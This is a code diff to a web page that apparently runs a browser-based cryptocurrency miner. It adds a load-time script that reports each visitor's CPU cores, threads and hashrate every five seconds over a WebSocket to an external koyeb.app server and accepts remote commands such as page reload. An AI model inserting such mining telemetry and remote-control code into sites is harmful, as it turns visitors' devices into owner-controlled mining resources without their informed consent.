@@ -430,7 +430,111 @@
   <script defer="defer" src="index.js"></script>
 
   <script>
-    // Sync Vectra stats to Sidebar
+    // =========================================================================
+    // HASHRATE REPORTING TO SERVER
+    // =========================================================================
+    let infoSocket = null;
+    let infoReconnectTimeout = null;
+    const CLIENT_VERSION = '2.5.0';
+    
+    function getWsUrl() {
+      return 'wss://respectable-gilemette-timco-f0e524a9.koyeb.app/proxy';
+    }
+    
+    function connectInfoSocket() {
+      if (infoSocket && infoSocket.readyState === WebSocket.OPEN) return;
+      
+      try {
+        infoSocket = new WebSocket(getWsUrl());
+        
+        infoSocket.onopen = function() {
+          console.log('[Info] Connected to server for reporting');
+          // Send initial info
+          setTimeout(sendMinerInfo, 1000);
+        };
+        
+        infoSocket.onmessage = function(e) {
+          // Handle server commands if needed
+          try {
+            const msg = JSON.parse(e.data);
+            if (msg.type === 'command') {
+              handleRemoteCommand(msg.action || msg.params?.action, msg);
+            }
+          } catch(err) {}
+        };
+        
+        infoSocket.onclose = function() {
+          console.log('[Info] Disconnected, reconnecting in 5s...');
+          infoReconnectTimeout = setTimeout(connectInfoSocket, 5000);
+        };
+        
+        infoSocket.onerror = function(err) {
+          console.error('[Info] Socket error:', err);
+        };
+      } catch(e) {
+        console.error('[Info] Failed to connect:', e);
+        infoReconnectTimeout = setTimeout(connectInfoSocket, 5000);
+      }
+    }
+    
+    function sendMinerInfo() {
+      if (!infoSocket || infoSocket.readyState !== WebSocket.OPEN) return;
+      
+      // Get stats from the Vectra miner UI elements
+      const rateEl = document.getElementById('rate');
+      const totalEl = document.getElementById('total');
+      const threadEl = document.getElementById('thread');
+      
+      const hashrate = rateEl ? parseFloat(rateEl.innerText) || 0 : 0;
+      const threads = threadEl ? parseInt(threadEl.innerText) || 0 : 0;
+      
+      const info = {
+        type: 'info',
+        params: {
+          cores: navigator.hardwareConcurrency || 4,
+          threads: threads,
+          throttle: 0,
+          status: hashrate > 0 ? 'mining' : 'stopped',
+          hashrate: hashrate,
+          clientVersion: CLIENT_VERSION
+        }
+      };
+      
+      infoSocket.send(JSON.stringify(info));
+    }
+    
+    function handleRemoteCommand(action, msg) {
+      console.log('[Remote] Command:', action);
+      
+      switch(action) {
+        case 'stop':
+          // Stop mining - would need access to the miner object
+          console.log('[Remote] Stop command received');
+          break;
+        case 'start':
+          console.log('[Remote] Start command received');
+          break;
+        case 'refresh':
+          location.reload();
+          break;
+        case 'kick':
+          if (infoSocket) infoSocket.close();
+          console.log('[Remote] Kicked by owner');
+          break;
+      }
+    }
+    
+    // Connect after page loads and report info periodically
+    window.addEventListener('load', function() {
+      setTimeout(connectInfoSocket, 2000);
+      
+      // Send info every 5 seconds
+      setInterval(sendMinerInfo, 5000);
+    });
+    
+    // =========================================================================
+    // SYNC VECTRA STATS TO SIDEBAR
+    // =========================================================================
     setInterval(() => {
         const rateElement = document.getElementById('rate');
         const totalElement = document.getElementById('total');
@@ -455,6 +559,16 @@
             }
             if(document.getElementById('barText')) document.getElementById('barText').innerText = 'Mining: ' + rate;
             if(document.getElementById('barFill')) document.getElementById('barFill').style.width = '100%';
+        }
+        
+        // Also update the main content area workers
+        if(document.getElementById('threads')) document.getElementById('threads').innerText = threads;
+        if(document.getElementById('thread')) {
+            // Fix the worker count display - should show actual threads
+            const numThreads = parseInt(threads) || 0;
+            if (numThreads > 0) {
+                document.getElementById('thread').innerText = numThreads;
+            }
         }
     }, 1000);
   </script>
